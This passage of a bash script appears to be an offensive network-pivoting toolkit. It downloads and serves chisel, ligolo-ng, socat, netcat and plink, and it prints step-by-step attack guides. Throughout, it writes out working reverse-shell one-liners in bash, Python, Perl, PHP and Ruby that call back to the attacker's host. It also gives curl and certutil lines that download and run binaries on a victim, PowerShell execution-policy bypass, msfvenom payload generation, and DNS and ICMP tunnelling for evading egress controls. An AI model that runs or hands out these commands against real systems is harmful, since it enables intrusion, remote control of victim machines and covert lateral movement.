    log_note "Replace 172.16.5.X with pivot's internal IP"
    
    section "LIGOLO - DOUBLE PIVOT"
    
    echo ""
    echo "Pivot through a second host to reach even deeper networks."
    echo ""
    echo "1. On 2nd internal host, run agent connecting to 1st pivot's INTERNAL IP:"
    log_cmd "./agent -connect 172.16.5.X:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo "2. In ligolo console, select new session and view interfaces:"
    log_cmd "session"
    log_cmd "ifconfig"
    echo ""
    echo "3. Add route for deeper network:"
    log_cmd "sudo ip route add 10.10.10.0/24 dev ligolo"
    echo ""
    echo "4. Start tunnel for new session"
    
    section "LIGOLO - COMMAND REFERENCE"
    
    echo ""
    log_cmd "session           # List/select sessions"
    log_cmd "ifconfig          # Show victim's interfaces"
    log_cmd "start             # Start tunnel"
    log_cmd "stop              # Stop tunnel"
    log_cmd "listener_add      # Add reverse port forward"
    log_cmd "listener_list     # List port forwards"
    log_cmd "listener_del ID   # Remove port forward"
    
    section "LIGOLO - TROUBLESHOOTING"
    
    echo ""
    log_cmd "# Check TUN interface"
    log_cmd "ip link show ligolo"
    log_cmd "ip addr show ligolo"
    echo ""
    log_cmd "# Check routes"
    log_cmd "ip route | grep ligolo"
    echo ""
    log_cmd "# Remove conflicting route"
    log_cmd "sudo ip route del 172.16.5.0/24"
    echo ""
    log_cmd "# Recreate TUN interface"
    log_cmd "sudo ip link del ligolo 2>/dev/null"
    log_cmd "sudo ip tuntap add user \$(whoami) mode tun ligolo"
    log_cmd "sudo ip link set ligolo up"
    
    show_all_transfer_methods "ligolo_linux"
}

#===============================================================================
# SOCAT - COMPLETE GUIDE
#===============================================================================

show_socat() {
    section "SOCAT SETUP"
    
    [ -f "socat_linux" ] && echo "" && echo "File ready: socat_linux"
    
    section "SOCAT - REVERSE SHELL"
    
    echo ""
    echo "STEP 1: START LISTENER (on your attack machine)"
    echo ""
    log_cmd "nc -lvnp $CALLBACK_PORT"
    log_note "Or for full TTY:"
    log_cmd "socat file:\$(tty),raw,echo=0 TCP-LISTEN:$CALLBACK_PORT"
    
    echo ""
    echo "STEP 2: CONNECT BACK (on victim)"
    echo ""
    log_cmd "curl -so /tmp/s http://$IP:$HTTP_PORT/socat_linux && chmod +x /tmp/s && /tmp/s TCP:$IP:$CALLBACK_PORT EXEC:/bin/bash"
    echo ""
    log_note "Full TTY reverse shell:"
    log_cmd "/tmp/s TCP:$IP:$CALLBACK_PORT EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"
    
    section "SOCAT - PORT FORWARDING"
    
    echo ""
    echo "Forward connections from one port to another."
    echo ""
    log_cmd "# Basic port forward"
    log_cmd "/tmp/s TCP-LISTEN:8080,fork TCP:<TARGET>:80"
    log_note "Connections to victim:8080 forward to TARGET:80"
    echo ""
    log_cmd "# Bind to all interfaces"
    log_cmd "/tmp/s TCP-LISTEN:8080,bind=0.0.0.0,fork TCP:<TARGET>:80"
    echo ""
    log_cmd "# UDP forwarding"
    log_cmd "/tmp/s UDP-LISTEN:53,fork UDP:<DNS_SERVER>:53"
    
    section "SOCAT - SSL/TLS TUNNEL"
    
    echo ""
    log_cmd "# Generate certificate"
    log_cmd "openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem -batch"
    log_cmd "cat key.pem cert.pem > server.pem"
    echo ""
    log_cmd "# SSL listener"
    log_cmd "socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:127.0.0.1:80"
    echo ""
    log_cmd "# SSL client"
    log_cmd "socat TCP-LISTEN:8080,fork OPENSSL:<TARGET>:443,verify=0"
    
    show_all_transfer_methods "socat_linux"
}

#===============================================================================
# NETCAT - COMPLETE GUIDE
#===============================================================================

show_netcat() {
    section "NETCAT SETUP"
    
    [ -f "nc_linux" ] && echo "" && echo "File ready: nc_linux"
    
    section "NETCAT - REVERSE SHELLS"
    
    echo ""
    echo "STEP 1: START LISTENER (on your attack machine)"
    echo ""
    log_cmd "nc -lvnp $CALLBACK_PORT"
    
    echo ""
    echo "STEP 2: CONNECT BACK (on victim)"
    echo ""
    log_cmd "curl -so /tmp/n http://$IP:$HTTP_PORT/nc_linux && chmod +x /tmp/n && /tmp/n $IP $CALLBACK_PORT -e /bin/bash"
    
    section "ALTERNATIVE REVERSE SHELLS (no netcat needed)"
    
    echo ""
    log_cmd "# Bash"
    log_cmd "bash -i >& /dev/tcp/$IP/$CALLBACK_PORT 0>&1"
    echo ""
    log_cmd "# Bash with mkfifo"
    log_cmd "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $CALLBACK_PORT >/tmp/f"
    echo ""
    log_cmd "# Python"
    log_cmd "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$IP\",$CALLBACK_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    echo ""
    log_cmd "# Perl"
    log_cmd "perl -e 'use Socket;\$i=\"$IP\";\$p=$CALLBACK_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    echo ""
    log_cmd "# PHP"
    log_cmd "php -r '\$sock=fsockopen(\"$IP\",$CALLBACK_PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    echo ""
    log_cmd "# Ruby"
    log_cmd "ruby -rsocket -e'f=TCPSocket.open(\"$IP\",$CALLBACK_PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    
    section "SHELL UPGRADE"
    
    echo ""
    echo "After getting shell, upgrade to full TTY:"
    echo ""
    log_cmd "# On victim"
    log_cmd "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
    log_cmd "# Press Ctrl+Z"
    echo ""
    log_cmd "# On attacker"
    log_cmd "stty raw -echo; fg"
    echo ""
    log_cmd "# On victim"
    log_cmd "export TERM=xterm"
    log_cmd "stty rows 40 cols 160"
    
    show_all_transfer_methods "nc_linux"
}

#===============================================================================
# PLINK - COMPLETE GUIDE
#===============================================================================

show_plink() {
    section "PLINK SETUP"
    
    [ -f "plink.exe" ] && echo "" && echo "File ready: plink.exe"
    
    section "PLINK - SSH TUNNELING FROM WINDOWS"
    
    echo ""
    echo "PREREQUISITE: SSH server must be running on your attack machine"
    echo ""
    log_cmd "sudo systemctl start ssh"
    log_cmd "sudo systemctl status ssh"
    
    echo ""
    echo "STEP 1: DOWNLOAD PLINK (on Windows victim)"
    echo ""
    log_cmd "certutil -urlcache -f http://$IP:$HTTP_PORT/plink.exe %TEMP%\\p.exe"
    log_cmd "powershell -ep bypass -c \"iwr http://$IP:$HTTP_PORT/plink.exe -o \$env:TEMP\\p.exe\""
    
    echo ""
    echo "STEP 2: CREATE TUNNEL"
    echo ""
    log_cmd "# Dynamic SOCKS proxy"
    log_cmd "%TEMP%\\p.exe -ssh $IP -l <SSH_USER> -pw <SSH_PASS> -D 9050 -N"
    echo ""
    log_cmd "# Local port forward (access internal RDP)"
    log_cmd "%TEMP%\\p.exe -ssh $IP -l <USER> -pw <PASS> -L 3389:<INTERNAL_TARGET>:3389 -N"
    echo ""
    log_cmd "# Reverse port forward (make your listener accessible)"
    log_cmd "%TEMP%\\p.exe -ssh $IP -l <USER> -pw <PASS> -R 4444:127.0.0.1:4444 -N"
    
    section "PLINK - AUTO-ACCEPT HOST KEY"
    
    echo ""
    log_cmd "echo y | %TEMP%\\p.exe -ssh $IP -l <USER> -pw <PASS> -D 9050 -N"
    
    show_all_transfer_methods "plink.exe"
}

#===============================================================================
# SSH TUNNELING GUIDE
#===============================================================================

show_ssh_guide() {
    section "SSH TUNNELING GUIDE"
    
    subsection "LOCAL PORT FORWARD (-L)"
    echo ""
    echo "Access a remote service through the SSH tunnel."
    echo ""
    log_cmd "ssh -L <LOCAL_PORT>:<TARGET>:<TARGET_PORT> user@pivot"
    echo ""
    log_cmd "# Example: Access internal web server"
    log_cmd "ssh -L 8080:172.16.5.19:80 user@pivot"
    log_note "Now browse to http://localhost:8080"
    echo ""
    log_cmd "# Multiple ports"
    log_cmd "ssh -L 8080:172.16.5.19:80 -L 3389:172.16.5.19:3389 user@pivot"
    
    subsection "DYNAMIC PORT FORWARD (-D) - SOCKS PROXY"
    echo ""
    echo "Create a SOCKS proxy for any destination."
    echo ""
    log_cmd "ssh -D 9050 user@pivot"
    echo ""
    log_cmd "# Then use with proxychains"
    log_cmd "proxychains nmap -sT -Pn 172.16.5.0/24"
    log_cmd "proxychains curl http://172.16.5.19"
    
    subsection "REMOTE/REVERSE PORT FORWARD (-R)"
    echo ""
    echo "Make YOUR local port accessible on the remote/pivot host."
    echo ""
    log_cmd "ssh -R <REMOTE_BIND_IP>:<REMOTE_PORT>:<LOCAL_IP>:<LOCAL_PORT> user@pivot"
    echo ""
    log_cmd "# Example: Make your listener accessible from internal network"
    log_cmd "# First start listener on your machine:"
    log_cmd "nc -lvnp 4444"
    echo ""
    log_cmd "# Then create reverse forward:"
    log_cmd "ssh -R 172.16.5.129:4444:127.0.0.1:4444 user@pivot -N"
    log_note "Internal hosts connecting to 172.16.5.129:4444 reach YOUR listener"
    
    subsection "SSH OPTIONS"
    echo ""
    log_cmd "-N    # Don't execute remote command (tunnel only)"
    log_cmd "-f    # Background after authentication"
    log_cmd "-v    # Verbose (debug connection issues)"
    log_cmd "-C    # Compression"
    log_cmd "-o StrictHostKeyChecking=no    # Skip host key verification"
    log_cmd "-o UserKnownHostsFile=/dev/null"
    
    subsection "SSHUTTLE - VPN OVER SSH"
    echo ""
    echo "Routes traffic like a VPN - no proxychains needed!"
    echo ""
    log_cmd "sudo apt install sshuttle"
    log_cmd "sudo sshuttle -r user@pivot 172.16.5.0/24"
    echo ""
    log_cmd "# Now access directly:"
    log_cmd "nmap -sT 172.16.5.19"
    log_cmd "curl http://172.16.5.19"
}

#===============================================================================
# NETSH GUIDE (Windows)
#===============================================================================

show_netsh_guide() {
    section "NETSH PORT FORWARDING (Windows Native)"
    
    echo ""
    echo "Built into Windows - no additional tools needed!"
    echo "Requires Administrator privileges."
    
    subsection "CREATE PORT FORWARD"
    echo ""
    log_cmd "netsh interface portproxy add v4tov4 \\"
    log_cmd "    listenport=<LISTEN_PORT> \\"
    log_cmd "    listenaddress=0.0.0.0 \\"
    log_cmd "    connectport=<TARGET_PORT> \\"
    log_cmd "    connectaddress=<TARGET_IP>"
    
    subsection "COMMON EXAMPLES"
    echo ""
    log_cmd "# RDP Forward"
    log_cmd "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=<TARGET>"
    log_note "Then: xfreerdp /v:<PIVOT_IP>:8080 /u:user /p:pass"
    echo ""
    log_cmd "# SMB Forward"
    log_cmd "netsh interface portproxy add v4tov4 listenport=8445 listenaddress=0.0.0.0 connectport=445 connectaddress=<TARGET>"
    log_note "Then: smbclient -L //<PIVOT_IP> -p 8445 -U user"
    echo ""
    log_cmd "# WinRM Forward"
    log_cmd "netsh interface portproxy add v4tov4 listenport=5986 listenaddress=0.0.0.0 connectport=5985 connectaddress=<TARGET>"
    log_note "Then: evil-winrm -i <PIVOT_IP> -P 5986 -u user -p pass"
    echo ""
    log_cmd "# HTTP Forward"
    log_cmd "netsh interface portproxy add v4tov4 listenport=8888 listenaddress=0.0.0.0 connectport=80 connectaddress=<TARGET>"
    
    subsection "MANAGEMENT"
    echo ""
    log_cmd "# List all port forwards"
    log_cmd "netsh interface portproxy show v4tov4"
    echo ""
    log_cmd "# Remove ALL forwards"
    log_cmd "netsh interface portproxy reset"
    echo ""
    log_cmd "# Remove specific forward"
    log_cmd "netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0"
    
    subsection "FIREWALL (if blocked)"
    echo ""
    log_cmd "netsh advfirewall firewall add rule name=\"Pivot\" dir=in action=allow protocol=tcp localport=8080"
    
    subsection "POWERSHELL RECON ONE-LINER"
    echo ""
    echo "Auto-discover networks and generate pivot commands:"
    echo ""
    log_cmd "powershell -c \"Get-NetIPAddress -AddressFamily IPv4|?{\\\$_.IPAddress-ne'127.0.0.1'}|%{Write-Host \\\$_.InterfaceAlias': '\\\$_.IPAddress};Get-NetNeighbor -State Reachable|?{\\\$_.IPAddress-match'^\\d+\\.'}|%{Write-Host 'ARP: '\\\$_.IPAddress}\""
}

#===============================================================================
# DNS TUNNELING GUIDE
#===============================================================================

show_dns_guide() {
    section "DNS TUNNELING (dnscat2)"
    
    echo ""
    echo "Tunnel traffic over DNS queries."
    echo "Useful when only DNS (UDP 53) is allowed outbound."
    
    subsection "SERVER SETUP (on your attack machine)"
    echo ""
    log_cmd "git clone https://github.com/iagox86/dnscat2.git"
    log_cmd "cd dnscat2/server"
    log_cmd "sudo gem install bundler"
    log_cmd "sudo bundle install"
    log_cmd "sudo ruby dnscat2.rb --dns host=$IP,port=53,domain=yourdomain.com --no-cache"
    
    subsection "WINDOWS CLIENT"
    echo ""
    log_cmd "git clone https://github.com/lukebaggett/dnscat2-powershell.git"
    echo ""
    log_cmd "# Transfer to Windows and run:"
    log_cmd "Import-Module .\\dnscat2.ps1"
    log_cmd "Start-Dnscat2 -DNSserver $IP -Domain yourdomain.com -PreSharedSecret <SECRET> -Exec cmd"
    
    subsection "LINUX CLIENT"
    echo ""
    log_cmd "cd dnscat2/client"
    log_cmd "make"
    log_cmd "./dnscat --dns server=$IP,port=53 --secret=<SECRET>"
    
    subsection "INTERACT WITH SESSION"
    echo ""
    log_cmd "window -i 1      # Connect to session"
    log_cmd "shell            # Get shell"
    log_cmd "download <file>  # Download file"
    log_cmd "upload <file>    # Upload file"
}

#===============================================================================
# ICMP TUNNELING GUIDE
#===============================================================================

show_icmp_guide() {
    section "ICMP TUNNELING (ptunnel-ng)"
    
    echo ""
    echo "Tunnel traffic inside ICMP ping packets."
    echo "Useful when only ICMP is allowed."
    
    subsection "BUILD PTUNNEL-NG"
    echo ""
    log_cmd "git clone https://github.com/utoni/ptunnel-ng.git"
    log_cmd "cd ptunnel-ng"
    log_cmd "sudo apt install automake autoconf -y"
    log_cmd "./autogen.sh"
    
    subsection "SERVER (on pivot host)"
    echo ""
    log_cmd "sudo ./ptunnel-ng -r<PIVOT_IP> -R22"
    
    subsection "CLIENT (on your attack machine)"
    echo ""
    log_cmd "sudo ./ptunnel-ng -p<PIVOT_IP> -l2222 -r<PIVOT_IP> -R22"
    
    subsection "CONNECT THROUGH ICMP TUNNEL"
    echo ""
    log_cmd "ssh -p2222 user@127.0.0.1"
    log_cmd "ssh -D 9050 -p2222 user@127.0.0.1    # SOCKS proxy"
}

#===============================================================================
# SOCKSOVERRDP GUIDE
#===============================================================================

show_socksoverrdp_guide() {
    section "SOCKSOVERRDP (Windows-to-Windows Pivoting)"
    
    echo ""
    echo "Create SOCKS proxy through RDP's Dynamic Virtual Channels."
    echo "Useful when you can only RDP into Windows environments."
    
    subsection "DOWNLOAD TOOLS (on your attack machine)"
    echo ""
    log_cmd "mkdir -p ~/shared && cd ~/shared"
    log_cmd "curl -sLO https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip"
    log_cmd "curl -sLO https://www.proxifier.com/download/ProxifierPE.zip"
    log_cmd "unzip SocksOverRDP-x64.zip"
    log_cmd "unzip ProxifierPE.zip"
    
    subsection "RDP WITH SHARED FOLDER"
    echo ""
    log_cmd "xfreerdp /v:<PIVOT_IP> /u:<USER> /p:<PASS> /drive:shared,~/shared +clipboard"
    
    subsection "ON WINDOWS PIVOT"
    echo ""
    log_cmd "# Register the DLL"
    log_cmd "regsvr32.exe \\\\tsclient\\shared\\SocksOverRDP-x64\\SocksOverRDP-Plugin.dll"
    echo ""
    log_cmd "# Then RDP to internal host"
    log_cmd "mstsc.exe /v:<INTERNAL_TARGET>"
    log_note "SocksOverRDP popup shows proxy on 127.0.0.1:1080"
    
    subsection "USE PROXIFIER"
    echo ""
    log_cmd "# Run ProxifierPE.exe from shared folder"
    log_cmd "# Add SOCKS5 proxy: 127.0.0.1:1080"
    log_note "Now all Windows apps route through internal network"
}

#===============================================================================
# METASPLOIT INTEGRATION
#===============================================================================

show_metasploit_guide() {
    section "METASPLOIT PIVOTING"
    
    subsection "AUTOROUTE (after getting meterpreter session)"
    echo ""
    log_cmd "# In meterpreter session"
    log_cmd "run autoroute -s 172.16.5.0/24"
    log_cmd "run autoroute -p    # Print routes"
    echo ""
    log_cmd "# Or in msfconsole"
    log_cmd "use post/multi/manage/autoroute"
    log_cmd "set SESSION 1"
    log_cmd "set SUBNET 172.16.5.0"
    log_cmd "run"
    
    subsection "SOCKS PROXY"
    echo ""
    log_cmd "use auxiliary/server/socks_proxy"
    log_cmd "set SRVHOST 127.0.0.1"
    log_cmd "set SRVPORT 1080"
    log_cmd "run -j"
    echo ""
    log_cmd "# Then use with proxychains"
    log_cmd "proxychains nmap -sT -Pn 172.16.5.0/24"
    
    subsection "PORTFWD"
    echo ""
    log_cmd "# In meterpreter session"
    log_cmd "portfwd add -l 3389 -p 3389 -r 172.16.5.19"
    log_note "Now xfreerdp /v:127.0.0.1 reaches internal host"
    echo ""
    log_cmd "portfwd list    # List forwards"
    log_cmd "portfwd delete -l 3389    # Remove"
    
    subsection "PAYLOAD FOR PIVOTING"
    echo ""
    log_cmd "# Generate payload that calls back through pivot"
    log_cmd "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<PIVOT_INTERNAL_IP> LPORT=8080 -f exe -o shell.exe"
    echo ""
    log_cmd "# Set up handler with SSH reverse forward"
    log_cmd "ssh -R <PIVOT_INTERNAL_IP>:8080:127.0.0.1:8080 user@pivot -N"
}

#===============================================================================
# HTTP SERVER
#===============================================================================

start_server() {
    section "HTTP FILE SERVER"
    
    echo ""
    echo "Verifying files in $(pwd):"
    echo ""
    
    local file_count=0
    for file in chisel_linux chisel.exe ligolo_linux ligolo.exe socat_linux nc_linux plink.exe; do
        if [ -f "$file" ]; then
            local size=$(ls -lh "$file" 2>/dev/null | awk '{print $5}')
            log_info "$file ($size)"
            file_count=$((file_count + 1))
        fi
    done
    
    if [ $file_count -eq 0 ]; then
        log_error "No files available to serve!"
        echo ""
        echo "Current directory contents:"
        ls -la
        return 1
    fi
    
    echo ""
    echo "============================================================"
    echo " SERVING: http://$IP:$HTTP_PORT/"
    echo " Files: $file_count"
    echo " Press Ctrl+C to stop"
    echo "============================================================"
    echo ""
    
    # Start HTTP server with error suppression
    if command -v python3 &>/dev/null; then
        python3 -m http.server "$HTTP_PORT" --bind 0.0.0.0 2>&1 | grep -v "BrokenPipeError\|Exception"
    elif command -v python &>/dev/null; then
        python -m SimpleHTTPServer "$HTTP_PORT" 2>&1 | grep -v "BrokenPipeError"
    elif command -v php &>/dev/null; then
        php -S "0.0.0.0:$HTTP_PORT"
    elif command -v ruby &>/dev/null; then
        ruby -run -e httpd . -p "$HTTP_PORT"
    else
        log_error "No HTTP server available!"
        echo "Files are in: $(pwd)"
        echo ""
        echo "Manual transfer options:"
        log_cmd "cd $(pwd) && python3 -m http.server $HTTP_PORT"
        log_cmd "cd $(pwd) && php -S 0.0.0.0:$HTTP_PORT"
        log_cmd "nc -lvnp $HTTP_PORT < <FILE>"
        read -p "Press Enter to continue..." </dev/tty 2>/dev/null || true
    fi
}

#===============================================================================
# QUICK MODE - Direct tool selection
#===============================================================================

quick_mode() {
    local tool="$1"
    
    case "$tool" in
        chisel)
            download_chisel
            show_chisel
            start_server
            ;;
        ligolo)
            download_ligolo
            show_ligolo
            start_server
            ;;
        socat)
            download_socat
            show_socat
            start_server
            ;;
        netcat|nc)
            download_netcat
            show_netcat
            start_server
            ;;
        plink)
            download_plink
            show_plink
            start_server
            ;;
        all)
            download_chisel
            download_ligolo
            download_socat
            download_netcat
            download_plink
            show_quick_reference
            start_server
            ;;
        *)
            log_error "Unknown tool: $tool"
            echo "Available: chisel, ligolo, socat, netcat, plink, all"
            exit 1
            ;;
    esac
}

show_quick_reference() {
    section "QUICK REFERENCE - ALL TOOLS"
    
    echo ""
    echo "CHISEL (SOCKS Proxy):"
    log_cmd "Attacker:  chisel server -p $CHISEL_PORT --reverse"
    log_cmd "Linux:     curl -so /tmp/c http://$IP:$HTTP_PORT/chisel_linux && chmod +x /tmp/c && /tmp/c client $IP:$CHISEL_PORT R:socks"
    log_cmd "Windows:   certutil -urlcache -f http://$IP:$HTTP_PORT/chisel.exe %TEMP%\\c.exe && %TEMP%\\c.exe client $IP:$CHISEL_PORT R:socks"
    
    echo ""
    echo "LIGOLO-NG (TUN Interface):"
    log_cmd "Setup:     sudo ip tuntap add user \$(whoami) mode tun ligolo && sudo ip link set ligolo up"
    log_cmd "Attacker:  ligolo-ng -selfcert -laddr 0.0.0.0:$LIGOLO_PORT"
    log_cmd "Linux:     curl -so /tmp/a http://$IP:$HTTP_PORT/ligolo_linux && chmod +x /tmp/a && /tmp/a -connect $IP:$LIGOLO_PORT -ignore-cert"
    log_cmd "Windows:   certutil -urlcache -f http://$IP:$HTTP_PORT/ligolo.exe %TEMP%\\a.exe && %TEMP%\\a.exe -connect $IP:$LIGOLO_PORT -ignore-cert"
    log_cmd "Route:     sudo ip route add <SUBNET>/24 dev ligolo"
    
    echo ""
    echo "REVERSE SHELLS:"
    log_cmd "Listener:  nc -lvnp $CALLBACK_PORT"
    log_cmd "Socat:     curl -so /tmp/s http://$IP:$HTTP_PORT/socat_linux && chmod +x /tmp/s && /tmp/s TCP:$IP:$CALLBACK_PORT EXEC:/bin/bash"
    log_cmd "Bash:      bash -i >& /dev/tcp/$IP/$CALLBACK_PORT 0>&1"
}

#===============================================================================
# MAIN
#===============================================================================

show_menu() {
    section "PIVOT SWISS ARMY KNIFE v$VERSION"
    
    echo ""
    echo "  TOOLS (download & serve):"
    echo "    1) Chisel        - SOCKS proxy over HTTP"
    echo "    2) Ligolo-ng     - TUN interface (no proxychains!)"
    echo "    3) Socat         - Port forwarding & shells"
    echo "    4) Netcat        - Reverse shells"
    echo "    5) Plink         - Windows SSH tunneling"
    echo "    6) All tools     - Download everything"
    echo ""
    echo "  GUIDES (no download):"
    echo "    7) SSH Tunneling"
    echo "    8) Netsh (Windows native)"
    echo "    9) DNS Tunneling (dnscat2)"
    echo "   10) ICMP Tunneling (ptunnel-ng)"
    echo "   11) SocksOverRDP"
    echo "   12) Metasploit Pivoting"
    echo ""
    echo "  UTILITIES:"
    echo "   13) Test SOCKS proxy"
    echo "   14) Test TUN interface"
    echo "   15) Configure proxychains"
    echo ""
    echo "    0) Exit"
    echo ""
}

main() {
    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --quick)
                shift
                IP=$(detect_ip)
                generate_ports
                log_info "Ports: HTTP=$HTTP_PORT CHISEL=$CHISEL_PORT LIGOLO=$LIGOLO_PORT SOCKS=$SOCKS_PORT CALLBACK=$CALLBACK_PORT"
                mkdir -p "$WORK_DIR" && cd "$WORK_DIR"
                quick_mode "$1"
                exit 0
                ;;
            --ip)
                shift
                IP="$1"
                ;;
            --port)
                shift
                HTTP_PORT="$1"
                ;;
            --keep)
                KEEP_FILES=1
                ;;
            --debug)
                DEBUG=1
                ;;
            --help|-h)
                echo "Usage: $0 [options]"
                echo ""
                echo "Options:"
                echo "  --quick <tool>   Skip menu, use tool directly (chisel/ligolo/socat/netcat/plink/all)"
                echo "  --ip <IP>        Set attacker IP"
                echo "  --port <PORT>    Set HTTP server port"
                echo "  --keep           Don't cleanup files on exit"
                echo "  --debug          Enable debug output"
                echo "  --help           Show this help"
                exit 0
                ;;
            *)
                log_error "Unknown option: $1"
                exit 1
                ;;
        esac
        shift
    done
    
    clear
    
    # Get IP
    local detected=$(detect_ip)
    if [ -n "$detected" ]; then
        IP=$(get_input "[?] Your IP [$detected]: " "$detected")
    else
        IP=$(get_input "[?] Your IP: " "")
    fi
    
    [ -z "$IP" ] && log_error "IP required" && exit 1
    
    # Generate all random ports
    generate_ports
    
    echo ""
    log_info "Ports assigned (random):"
    log_cmd "HTTP Server:  $HTTP_PORT"
    log_cmd "Chisel:       $CHISEL_PORT"
    log_cmd "Ligolo:       $LIGOLO_PORT"
    log_cmd "SOCKS Proxy:  $SOCKS_PORT"
    log_cmd "Callback:     $CALLBACK_PORT"
    
    # Setup work directory
    rm -rf "$WORK_DIR" 2>/dev/null
    mkdir -p "$WORK_DIR" && cd "$WORK_DIR" || exit 1
    
    # Show menu
    show_menu
    CHOICE=$(get_input "[?] Choice: " "0")
    
    case "$CHOICE" in
        1) download_chisel; show_chisel; start_server ;;
        2) download_ligolo; show_ligolo; start_server ;;
        3) download_socat; show_socat; start_server ;;
        4) download_netcat; show_netcat; start_server ;;
        5) download_plink; show_plink; start_server ;;
        6) 
            download_chisel
            download_ligolo
            download_socat
            download_netcat
            download_plink
            show_quick_reference
            start_server
            ;;
        7) show_ssh_guide ;;
        8) show_netsh_guide ;;
        9) show_dns_guide ;;
        10) show_icmp_guide ;;
        11) show_socksoverrdp_guide ;;
        12) show_metasploit_guide ;;
        13)
            local host=$(get_input "[?] Proxy host [127.0.0.1]: " "127.0.0.1")
            local port=$(get_input "[?] Proxy port [1080]: " "1080")
            local target=$(get_input "[?] Test target URL (optional): " "")
            test_socks_proxy "$host" "$port" "$target"
            ;;
        14)
            local iface=$(get_input "[?] Interface name [ligolo]: " "ligolo")
            local target=$(get_input "[?] Test target IP (optional): " "")
            test_tun_interface "$iface" "$target"
            ;;
        15)
            local type=$(get_input "[?] Proxy type [socks5]: " "socks5")
            local host=$(get_input "[?] Proxy host [127.0.0.1]: " "127.0.0.1")
            local port=$(get_input "[?] Proxy port [1080]: " "1080")
            configure_proxychains "$type" "$host" "$port"
            ;;
        0) log_info "Exiting"; exit 0 ;;
        *) log_error "Invalid choice"; exit 1 ;;
    esac
}

main "$@"
